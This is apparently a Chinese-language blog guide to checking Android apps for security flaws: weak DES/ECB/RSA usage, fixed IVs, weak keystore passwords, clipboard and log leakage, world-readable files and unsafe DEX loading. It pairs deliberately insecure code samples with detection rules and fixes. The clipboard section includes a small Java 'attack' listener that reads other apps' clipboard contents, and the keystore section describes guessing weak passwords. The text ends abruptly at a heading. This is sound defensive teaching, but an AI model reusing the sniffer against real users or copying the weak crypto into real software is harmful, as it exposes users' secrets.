<p>**风险等级：**低危</p>
<p><strong>问题示例</strong>：</p>
<p>使用des弱加密算法，风险代码样例：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">SecretKeySpec</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(rawKeyData, <span class="string">&quot;DES&quot;</span>);</span><br><span class="line"><span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;DES/ECB/PKCS5Padding&quot;</span>);</span><br><span class="line">cipher.init(Cipher.DECRYPT_MODE, key);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>通过正则表达式&quot;DES/(\w){3}/.+Padding&quot;匹配字符串常量。</p>
<p><strong>建议：</strong></p>
<p>建议使用安全性更高的AES加密算法</p>
<h3 id="不安全的密钥长度风险检测">不安全的密钥长度风险检测</h3>
<p>在使用RSA加密时，加密长度小于512bit，小于512bit的密钥很容易被破解，计算出密钥</p>
<p>**风险等级：**低危</p>
<p><strong>问题示例：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> KeyPair <span class="title function_">getRSAKey</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchAlgorithmException &#123;</span><br><span class="line">    <span class="type">KeyPairGenerator</span> <span class="variable">keyGen</span> <span class="operator">=</span> KeyPairGenerator.getInstance(<span class="string">&quot;RSA&quot;</span>);</span><br><span class="line">    keyGen.initialize(<span class="number">512</span>);</span><br><span class="line">    <span class="type">KeyPair</span> <span class="variable">key</span> <span class="operator">=</span> keyGen.generateKeyPair();</span><br><span class="line">    <span class="keyword">return</span> key;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对应的smali代码如下：</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Ljava<span class="regexp">/security/</span>KeyPairGenerator;-&gt;getInstance(Ljava<span class="regexp">/lang/</span>String;)Ljava<span class="regexp">/security/</span>KeyPairGenerator;</span><br><span class="line"></span><br><span class="line">Ljava<span class="regexp">/security/</span>KeyPairGenerator;-&gt;initialize(I)V</span><br></pre></td></tr></table></figure>
<p>通过匹配上述函数，并根据initialize函数的参数值判断。</p>
<p><strong>建议</strong>：</p>
<p>在使用RSA加密时，建议密钥长度大于1024bit</p>
<h3 id="AES-ECB弱加密风险检测">AES-ECB弱加密风险检测</h3>
<p>AES的ECB加密模式容易遭到字典攻击，安全性不够</p>
<p>**风险等级：**低危</p>
<p><strong>问题示例：</strong></p>
<p>第一步，检测以下函数：</p>
<ul>
<li>getInstance(String transformation)</li>
<li>getInstance(String transformation, String provider)</li>
<li>getInstance(String transformation, Provider provider)</li>
</ul>
<p>第二步，检测上述函数第一个参数值出现以下情况的任意一种，即可认为该检测项不安全，标记为<code>低危</code>。</p>
<ul>
<li>“AES”，Android提供的AES加密算法API默认使用ECB模式</li>
<li>“DES”，DES默认是56位加密密钥，已经不安全</li>
<li>“AES/ECB/xxx”</li>
<li>“DES/ECB/xxx”</li>
<li>“DESede/ECB/xxx”</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">SecretKeySpec</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(keyBytes, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line"><span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;AES/ECB/PKCS7Padding&quot;</span>, <span class="string">&quot;BC&quot;</span>);</span><br><span class="line">cipher.init(Cipher.ENCRYPT_MODE, key);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><strong>建议</strong></p>
<p>避免使用ECB模式，建议使用CBC模式</p>
<h3 id="IVParameterSpec不安全初始化向量检测">IVParameterSpec不安全初始化向量检测</h3>
<p>使用IVParameterSpec函数，如果使用了固定的初始化向量，那么密码文本可预测性高得多，容易收到字典攻击。</p>
<p>**风险等级：**低危</p>
<p><strong>问题示例：</strong></p>
<p>初始化向量时，使用了硬编码到程序的常量</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">byte</span>[] iv = &#123; <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span> &#125;;</span><br><span class="line"><span class="type">IvParameterSpec</span> <span class="variable">ips</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">IvParameterSpec</span>(iv)</span><br></pre></td></tr></table></figure>
<p>匹配<code>Ljavax/crypto/spec/IvParameterSpec;-&gt;&lt;init&gt;([B)V</code>函数</p>
<p><strong>建议</strong></p>
<p>IVParameterSpec初始化时，不使用常量vector。</p>
<h3 id="RSA中不使用Padding风险检测">RSA中不使用Padding风险检测</h3>
<p>使用RSA公钥时通常会绑定一个padding，原因是为了防止一些依赖于no padding时对RSA算法的攻击</p>
<p>**风险等级：**低危</p>
<p><strong>问题示例：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="type">Cipher</span> <span class="variable">rsa</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    rsa = javax.crypto.Cipher.getInstance(<span class="string">&quot;RSA/NONE/NoPadding&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">catch</span> (java.security.NoSuchAlgorithmException e) &#123;&#125;</span><br><span class="line">  <span class="keyword">catch</span> (javax.crypto.NoSuchPaddingException e) &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">SecretKeySpec</span> <span class="variable">key</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(rawKeyData, <span class="string">&quot;RSA&quot;</span>);</span><br><span class="line"><span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> Cipher.getInstance(<span class="string">&quot;RSA/NONE/NoPadding&quot;</span>);</span><br><span class="line">cipher.init(Cipher.DECRYPT_MODE, key);</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>用正则表达式<code>RSA/(\w)&#123;3&#125;/NoPadding</code>匹配字符串常量</p>
<p><strong>建议：</strong></p>
<p>建议使用Padding模式。</p>
<h3 id="KeyStore弱密码风险检测">KeyStore弱密码风险检测</h3>
<p>keytool是一个java数据证书的管理工具，</p>
<p>keytool将密钥(key，私钥和公钥配对)和证书(certificates)存在一个称为keystore的文件中，并通过密码保护keystore中的密钥。如果密码设置过于简单，例如：123456、android等，则会导致keystore文件的私钥泄露，从而导致一系列的信息泄露风险。</p>
<p><strong>风险等级</strong>：<code>高危</code></p>
<p><strong>检测方法</strong></p>
<p>方法一）基于keytool命令行检测：</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">keytool</span> -list -keystore <span class="literal">debug</span>.keystore</span><br></pre></td></tr></table></figure>
<p>然后输入不安全的弱密码，若正常输出，表明该keystore文件存在弱密码风险</p>
<p>（方法二）基于pyjks的第三方python解析库</p>
<p>安装<code>pip install pyjks</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">check_keystore_pwd</span>(<span class="params">self, jks_file, pwd</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        jks.KeyStore.load(jks_file, pwd)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>然后通过常见的弱密码组合进行payload测试。</p>
<p><strong>建议</strong>：</p>
<p>提高keystore保护密码的强度。</p>
<h2 id="数据安全检测">数据安全检测</h2>
<h3 id="敏感信息检测">敏感信息检测</h3>
<p>通过正则表达式匹配敏感信息</p>
<p>我们可以通过如下的几个正则表达式，匹配邮箱地址，手机号，电话号码，身份证和qq等敏感的信息，看是否有在代码中出现，提醒开发者注意这些敏感信息，防止不必要的外泄</p>
<p>邮箱地址</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r<span class="attr">egexp5</span> <span class="operator">=</span> <span class="string">&quot;[<span class="char escape_">\w</span>.-]+@[<span class="char escape_">\w</span>-]+<span class="char escape_">\.</span>[<span class="char escape_">\w</span>.]+&quot;</span></span><br></pre></td></tr></table></figure>
<p>手机号</p>
<figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">regexp6 = &quot;^(<span class="number">13</span>[<span class="number">0</span>-<span class="number">9</span>]|<span class="number">14</span>[<span class="number">5</span>|<span class="number">7</span>]|<span class="number">15[0|1|2</span>|<span class="number">3|5|6|7</span>|<span class="number">8</span>|<span class="number">9</span>]|<span class="number">18[0|1|2</span>|<span class="number">3|5|6|7</span>|<span class="number">8</span>|<span class="number">9</span>])\d&#123;<span class="number">8</span>&#125;$&quot;</span><br></pre></td></tr></table></figure>
<p>电话号码</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r<span class="attr">egexp7</span> <span class="operator">=</span> <span class="string">&quot;<span class="char escape_">\d</span>&#123;3&#125;-<span class="char escape_">\d</span>&#123;8&#125;|<span class="char escape_">\d</span>&#123;4&#125;-<span class="char escape_">\d</span>&#123;7&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<p>身份证号</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">r<span class="attr">egexp8</span> <span class="operator">=</span> <span class="string">&quot;^<span class="char escape_">\d</span>&#123;15&#125;|<span class="char escape_">\d</span>&#123;18&#125;$&quot;</span></span><br></pre></td></tr></table></figure>
<p>QQ号</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">regexp9</span> <span class="operator">=</span> <span class="string">&quot;[1-9][0-9]&#123;4,&#125;&quot;</span></span><br></pre></td></tr></table></figure>
<h3 id="剪贴板敏感信息泄露风险检测">剪贴板敏感信息泄露风险检测</h3>
<p>由于Android剪贴板的内容向任何权限的app开放，很容易被嗅探泄密，同一部手机中安装的其他app，甚至是一些权限不高的app，都可以通过剪贴板功能获取剪贴板中的敏感信息</p>
<p>**风险等级：**提醒</p>
<p><strong>问题示例：</strong></p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">clipBtn = (Button) findViewById(R.id.btn_clip);</span><br><span class="line">clipBtn.setOnClickListener(<span class="keyword">new</span> <span class="title class_">OnClickListener</span>() &#123;</span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">	</span><br><span class="line">		<span class="type">ClipboardManager</span> <span class="variable">clipboard</span> <span class="operator">=</span> (ClipboardManager) getSystemService(Context.CLIPBOARD_SERVICE);</span><br><span class="line"></span><br><span class="line">        <span class="type">ClipData</span> <span class="variable">clip1</span> <span class="operator">=</span> ClipData.newPlainText(<span class="string">&quot;label&quot;</span>,<span class="string">&quot;password=123456&quot;</span>);</span><br><span class="line"></span><br><span class="line">        clipboard.setPrimaryClip(clip1);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>漏洞可以利用如下代码利用。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">Activity</span> &#123;</span><br><span class="line"></span><br><span class="line">	<span class="meta">@Override</span></span><br><span class="line">	<span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">		<span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">		setContentView(R.layout.activity_main);</span><br><span class="line"></span><br><span class="line">		<span class="type">ClipboardManager</span> <span class="variable">clipBoard</span> <span class="operator">=</span> (ClipboardManager)getSystemService(CLIPBOARD_SERVICE);</span><br><span class="line">		clipBoard.addPrimaryClipChangedListener( <span class="keyword">new</span> <span class="title class_">ClipboardListener</span>() );</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">attack</span><span class="params">()</span> &#123;</span><br><span class="line">		<span class="type">ClipboardManager</span> <span class="variable">cm</span> <span class="operator">=</span> (ClipboardManager) getSystemService(CLIPBOARD_SERVICE);</span><br><span class="line">		<span class="type">ClipData</span> <span class="variable">cd2</span> <span class="operator">=</span> cm.getPrimaryClip();</span><br><span class="line">		<span class="type">String</span> <span class="variable">clipText</span> <span class="operator">=</span> cd2.getItemAt(<span class="number">0</span>).getText().toString();</span><br><span class="line">		<span class="comment">//Log.v(&quot;clipboard&quot;, &quot;Attacked: &quot; + clipText);</span></span><br><span class="line">		Toast.makeText(getApplicationContext(), <span class="string">&quot;Attacked: &quot;</span> + clipText, Toast.LENGTH_LONG).show();</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">class</span> <span class="title class_">ClipboardListener</span> <span class="keyword">implements</span> <span class="title class_">ClipboardManager</span>.OnPrimaryClipChangedListener &#123;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onPrimaryClipChanged</span><span class="params">()</span> &#123;</span><br><span class="line">		   attack();</span><br><span class="line">	   &#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>建议：</strong></p>
<p>避免使用剪贴板明文存储敏感信息或进行加密。</p>
<h3 id="Intent敏感数据泄露风险检测">Intent敏感数据泄露风险检测</h3>
<p>APP创建Intent传递数据到其他Activity，如果创建的Activity不是在同一个Task中打开，就很可能被其他的Activity劫持读取到Intent内容，跨Task的Activity通过Intent传递敏感信息是不安全的。</p>
<p><strong>风险等级</strong>：<code>提醒</code></p>
<p><strong>问题示例：</strong></p>
<p>检测是否使用了FLAG_ACTIVITY_NEW_TASK标志。</p>
<p><strong>建议：</strong></p>
<p>尽量避免使用包含FLAG_ACTIVITY_NEW_TASK标志的Intent来传递敏感信息。</p>
<h3 id="PendingIntent误用风险">PendingIntent误用风险</h3>
<p>使用pendingIntent时候，如果使用了一个空Intent，会导致恶意用户劫持Intent的内容。禁止使用空intent去构造pendingIntent。</p>
<p>风险等级：<code>中危</code></p>
<p>问题示例：</p>
<p>通过判断代码片段中有没有出现以下函数，即可知道是否使用了空intent构造PendingIntent。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="2025-01-15-App%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90%E6%8C%87%E5%8D%97/image-20240920195326209.png" alt="image-20240920195326209"></p>
<p><strong>建议：</strong></p>
<p>禁止使用空intent去构造pendingIntent。</p>
<h3 id="密钥硬编码风险检测">密钥硬编码风险检测</h3>
<p>将密钥硬编码在Java代码、文件中，这样做会引起很大风险。<strong>信息安全的基础在于密码学，而常用的密码学算法都是公开的，加密内容的保密依靠的是密钥的保密</strong>，密钥如果泄露，对于对称密码算法，根据用到的密钥算法和加密后的密文，很容易得到加密前的明文；对于非对称密码算法或者签名算法，根据密钥和要加密的明文，很容易获得计算出签名值，从而伪造签名。</p>
<p>风险等级：<code>提醒</code></p>
<p>检测使用以下加密算法的路径，目前该检测项只检测是否在Java层有<strong>显式地</strong>保存密钥，这应该是最有风险的一种保存方式。</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">AES<span class="regexp">/CBC/</span>NoPadding</span><br><span class="line">AES<span class="regexp">/CBC/</span>PKCS7Padding</span><br><span class="line">AES<span class="regexp">/CTR/</span>NoPadding</span><br><span class="line">AES<span class="regexp">/ECB/</span>NoPadding</span><br><span class="line">AES<span class="regexp">/ECB/</span>PKCS7Padding</span><br><span class="line">AES<span class="regexp">/GCM/</span>NoPadding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>NoPadding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>PKCS1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">1</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">224</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">256</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">384</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPWithSHA-<span class="number">512</span>AndMGF1Padding</span><br><span class="line">RSA<span class="regexp">/ECB/</span>OAEPPadding</span><br></pre></td></tr></table></figure>
<h3 id="数据或程序加载检查">数据或程序加载检查</h3>
<p>**风险等级：**提醒</p>
<p>需要进行动态分析</p>
<ul>
<li>是否加载公共区域程序，如sdcard、/data/local/tmp/、应用自创建但其他应用有读写权限的目录上</li>
<li>是否从网络下载，检测方法包括：阅读代码、监听网路请求、见识存储区域文件读写、查看安装包</li>
<li>升级包是否存在公共区域存储</li>
</ul>
<h3 id="BASE64安全检测">BASE64安全检测</h3>
<p>风险等级：<code>提醒</code></p>
<p>检测出BASE64字符串，并解密。</p>
<h3 id="文件全局读写漏洞检测">文件全局读写漏洞检测</h3>
<p>在使用getDir，getSharedPreferences或openFileOutput时，如果设置了全局的可读权限，攻击者恶意读取文件内容，获取敏感信息。在设置文件属性时如果设置全局可写，攻击者可能会篡改、伪造内容，可能会进行诈骗等行为，造成用户财产损失。其中getSharedPreferences如果设置全局写权限，则当攻击app跟被攻击app具有相同的<code>Android:sharedUserId</code>属性时和签名时，攻击app则可以访问到内部存储文件进行写入操作。</p>
<p><strong>风险等级</strong>：<code>中危</code></p>
<p><strong>问题示例：</strong></p>
<p>检测出使用了getDir、getSharedPreferences和openFileOutput函数的参数值是否使用了<code>MODE_WORLD_READABLE和MODE_WORLD_WRITEABLE</code>。</p>
<p><strong>建议</strong>：</p>
<ul>
<li>使用MODE_PRIVATE模式创建内部存储文件</li>
<li>加密存储敏感数据</li>
<li>避免在文件中存储明文敏感信息</li>
<li>避免滥用”Android:sharedUserId”属性</li>
</ul>
<p>如果两个app<code>Android:sharedUserId</code>属性相同，切使用的签名也相同，则这两个app可以互相访问内部存储文件数据。</p>
<h3 id="日志泄露风险检测">日志泄露风险检测</h3>
<p>在APP的开发过程中，为了方便调试，通常会使用log函数输出一些关键流程的信息，这些信息中通常会包含敏感内容，如执行流程、明文的用户名密码等，这会让攻击者更加容易的了解APP内部结构方便破解和攻击，甚至直接获取到有价值的敏感信息。</p>
<p><strong>风险等级</strong>：<code>提醒</code></p>
<p><strong>问题示例</strong>：</p>
<p>检测是否调用了Log.v、Log.d、Log.e、Log.i、Log.w、Log.f、Log.s函数</p>
<p><strong>建议</strong>：</p>
<p>在生产环境中移除Log打印。</p>
<h3 id="外部加载dex检测">外部加载dex检测</h3>
<p>动态加载的dex文件存储在被其他应用任意读写的目录中(如sdcard)，如果没有对外部所加载的dex文件做完整性检验，应用将会被恶意代码注入，从而执行恶意代码</p>
<p>**风险等级：**高危</p>
<p><strong>问题示例：</strong></p>
<p>关键：public DexClassLoader (String dexPath, String optimizedDirectory, String libraryPath, ClassLoader parent)</p>
<p>首先获取所有调用了DexClassLoader函数的路径，然后对每个路径下的代码片段进行检查，判断有没有调用<code>Environment.getExternalStorageDirectory().toString()</code>该方法。两个条件同时满足，则判定该路径下的代码片段有风险。</p>
<p><strong>建议：</strong></p>
<ul>
<li>将所需要动态加载的DEX/APK文件放置在APK内部或应用私有目录中</li>
<li>使用加密网络协议进行下载加载的DEX/APK文件并将其放置在应用私有目录中</li>
<li>对不可信的加载来源进行完整性校验</li>
</ul>
<h3 id="外部存储路径检测">外部存储路径检测</h3>
<p>文件存放在external storage，例如sd卡，是全局可读可写的，由于external storage可以被任意用户操作，且可以被所有应用修改使用，所有，app的敏感数据建议不要存放在external storage</p>
<p>**风险等级：**低危</p>
<p>动态方法监测<code>/data/data/&lt;packagename&gt;/</code>目录下所有生成的目录是否带有明文信息泄露</p>
<h3 id="明文数字证书风险">明文数字证书风险</h3>
<p>Apk中使用的数字证书可被用来校验服务器的合法身份，以及在与服务器进行通信的过程中对传输数据进行加密、解密运算，保证传输数据的保密性、完整性。明文存储的数字证书如果被篡改，客户端可能连接到假冒的服务端上，导致用户名、密码等信息被窃取；如果明文证书被盗取，可能造成传输数据被截获解密，用户信息泄露，或者伪造客户端向服务器发送请求，篡改服务器中的用户数据或造成服务器响应异常。</p>
<p><strong>风险等级</strong>：<code>中危</code></p>
<p><strong>问题示例</strong>：</p>
<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[</span><br><span class="line">    <span class="string">&quot;assets/location_public_key.der&quot;</span>,</span><br><span class="line">    <span class="string">&quot;assets/verisign.cer&quot;</span>,</span><br><span class="line">    <span class="string">&quot;res/raw/servicecert.cer&quot;</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<h2 id="敏感函数调用检测">敏感函数调用检测</h2>
<h3 id="安全相关的函数检测">安全相关的函数检测</h3>
<p>一些存放敏感的安全配置信息的<strong>函数</strong>，一般函数名都可能带有encrypt、decrypt、encod、decod、aes、sha1、sha256、sha512、md5、decode、encode等关键字。</p>
<p>通过encrypt、decrypt、encod、decod、aes、sha1、sha256、sha512、md5、decode、encode等和安全相关的关键字进行匹配查找，然后逐个检测类的安全性。</p>
<h3 id="安全相关的类检测">安全相关的类检测</h3>
<p>一些存放敏感的安全配置信息的<strong>文件</strong>，一般文件都可能带有encrypt、decrypt、encod、decod、aes、sha1、sha256、sha512、md5、decode、encode等关键字。</p>
<p>通过encrypt、decrypt、encod、decod、aes、sha1、sha256、sha512、md5、decode、encode等和安全相关的关键字进行匹配查找，然后逐个检测类的安全性。</p>
<h3 id="运行命令检测">运行命令检测</h3>
<p>检测 命令执行相关的代码</p>
<p><strong>问题示例：</strong></p>
<p>Java代码</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Runtime rr <span class="operator">=</span> Runtime.getRuntime()<span class="comment">;</span></span><br><span class="line"></span><br><span class="line">Process p <span class="operator">=</span> rr.exec(<span class="string">&quot;ls -al&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>Dalvik/ART</p>
<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const-string v2, <span class="string">&quot;ls -al&quot;</span></span><br><span class="line"><span class="built_in"></span></span><br><span class="line"><span class="built_in">invoke-virtual </span>&#123;v1, v2&#125;, <span class="class">Ljava/lang/Runtime;</span>-&gt;exec(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/Process;</span></span><br></pre></td></tr></table></figure>
<h3 id="Native-Library加载检测">Native Library加载检测</h3>
<p>检测加载so文件的Native方法。</p>
<p><strong>风险等级</strong>：<code>提示</code></p>
<p>Java代码</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">System.loadLibrary(<span class="string">&quot;libtest.so&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>Dalvik/ART</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Ljava<span class="regexp">/lang/</span>System;-&gt;loadLibrary(Ljava<span class="regexp">/lang/</span>String;)V</span><br></pre></td></tr></table></figure>
<h3 id="外部动态加载dex检测">外部动态加载dex检测</h3>
<p>在Android4.1之前的系统版本，允许应用在全局可读可写的位置动态加载dex文件，有文件被替换的风险</p>
<p><strong>风险等级</strong>：<code>提醒</code></p>
<p><strong>问题示例</strong>：</p>
<p>需要检测代码中的DexClassLoader和Android版本，只有Android版本 &lt; 4.1才会出现该漏洞。</p>
<p>Java代码</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DexClassLoader</span> <span class="variable">cl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DexClassLoader</span>(</span><br><span class="line">    optimizedDexOutputPath.getAbsolutePath(),              <span class="comment">//参数1</span></span><br><span class="line">    Environment.getExternalStorageDirectory().toString(),  <span class="comment">//参数2</span></span><br><span class="line">    <span class="literal">null</span>,                                                  <span class="comment">//参数3</span></span><br><span class="line">    getClassLoader());                                     <span class="comment">//参数4</span></span><br></pre></td></tr></table></figure>
<p>Dalvik/ART</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line">Ldalvik<span class="symbol">/system/DexClassLoader</span>;<span class="operator">-&gt;</span><span class="symbol">&lt;init&gt;</span>(Ljava<span class="symbol">/lang/String</span>;Ljava<span class="symbol">/lang/String</span>;</span><br><span class="line"></span><br><span class="line">Ljava<span class="symbol">/lang/String</span>;Ljava<span class="symbol">/lang/ClassLoader</span>;)V</span><br><span class="line"></span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p><strong>建议</strong></p>
<ul>
<li>禁止外部（不安全的源）加载DEX，将所需要动态加载的DEX/APK文件放置到APK内部或应用私有目录中。</li>
<li>使用加密网络协议进行下载加载的DEX/APK文件并将其放置到应用私有目录中。</li>
<li>对不可信的加载来源进行完整性校验。</li>
</ul>
<h3 id="root代码检测">root代码检测</h3>
<p>检查app是否有执行检测root环境的代码。</p>
<p><strong>风险等级</strong>：<code>提醒</code></p>
<p><strong>问题示例</strong>：</p>
<p>Java代码</p>
<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Runtime rr <span class="operator">=</span> Runtime.getRuntime()<span class="comment">;</span></span><br><span class="line">Process p <span class="operator">=</span> rr.exec(<span class="string">&quot;su&quot;</span>)<span class="comment">;</span></span><br></pre></td></tr></table></figure>
<p>Dalvik/ART</p>
